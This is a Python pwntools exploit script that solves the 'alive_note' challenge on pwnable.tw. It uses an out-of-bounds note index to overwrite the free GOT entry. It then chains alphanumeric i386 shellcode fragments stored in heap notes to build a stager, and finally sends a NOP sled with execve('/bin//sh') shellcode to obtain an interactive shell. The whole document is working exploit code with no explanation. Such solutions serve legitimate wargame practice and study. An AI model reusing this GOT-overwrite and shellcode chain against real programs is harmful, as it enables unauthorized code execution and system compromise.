#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
exe = context.binary = ELF('./alive_note')
context.terminal = ["tilix","-a","session-add-right","-e"]

host = args.HOST or 'chall.pwnable.tw'
port = int(args.PORT or 10300)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

def choice(option):
    io.sendlineafter("Your choice :", str(option))

def add(idx, name):
    choice(1)
    io.sendlineafter("Index :", str(idx))
    io.sendafter("Name :", name)

def show(idx):
    choice(2)
    io.sendlineafter("Index :", str(idx))

def delete(idx):
    choice(3)
    io.sendlineafter("Index :", str(idx))

context.arch = 'i386'
allowed_chars = [0x0, 0x20, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4a, 0x4b, 0x4c,
0x4d, 0x4e, 0x4f, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5a, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0x6a, 0x6b,
0x6c, 0x6d, 0x6e, 0x6f, 0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7a]

sc0 = asm("""
    pop  ecx
    pop  ecx
    dec edx
    push edx
    pop eax
""") + b'\x71\x39\x00'

sc1 = asm("""
    inc ebx;
    inc ebx;
    xor ax, 0x4f73;
""") + b'\x71\x38'

sc2 = asm("""
    inc ebx;
    push ebx;
    xor ax, 0x3041;
""") + b'\x71\x38'

sc3 = asm("""
    push eax;
    pop edx;
    push ecx
    pop eax;
    push ebx;
    push ecx
""") + b'\x71\x38'

sc4 = asm("""
    xor ax, 0x2020
    push 0x58
""") + b'\x71\x38'

sc5 = asm("""
    xor dword ptr [eax+0x52], edx
    pop edx
    push 0x5a
""") + b'\x71\x38'

sc6 = asm("""
    xor dword ptr [eax+0x4e], edx
    pop edx
    push eax
    pop ecx
""") + b'\x71\x38'
sc7 = asm("""
    xor dword ptr [eax+0x4f], edx
    xor dword ptr [eax+0x50], edx
""") + b'\x71\x38'

sc8 = asm("""
    xor dword ptr [eax+0x4d], edx
    xor dword ptr [eax+0x51], edx
""") + b'\x71\x38' # jno 0x38
io = start()
add(-27, sc0) # overwrite free got with first heap allocation
add(0, "\x00"*8)
add(0, "\x00"*8)
add(0, "\x00"*8)
add(0, sc1)
add(0, "\x00"*8)
add(0, "\x00"*8)
add(0, "\x00"*8)
add(0, sc2)
add(0, "\x00"*8)
add(0, "\x00"*8)
add(0, "\x00"*8)
add(0, sc3)
add(0, "\x00"*8)
add(0, "\x00"*8)
add(0, "\x00"*8)
add(0, sc4)
add(0, "\x00"*8)
add(0, "\x00"*8)
add(0, "\x00"*8)
add(0, sc5)
add(0, "\x00"*8)
add(0, "\x00"*8)
add(0, "\x00"*8)
add(0, sc6)
add(0, "\x00"*8)
add(0, "\x00"*8)
add(0, "\x00"*8)
add(0, sc7)
add(0, "\x00"*8)
add(0, "\x00"*8)
add(0, "\x00"*8)
add(0, sc8)
add(0, "\x00"*8)
add(0, "\x00"*8)
add(0, "\x00"*8)
add(0, "K"*3 + "\x71\x38")
add(0, "\x00"*8)

ape = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
delete(-27)
io.sendline(b"\x90"*100 + ape)
io.interactive()
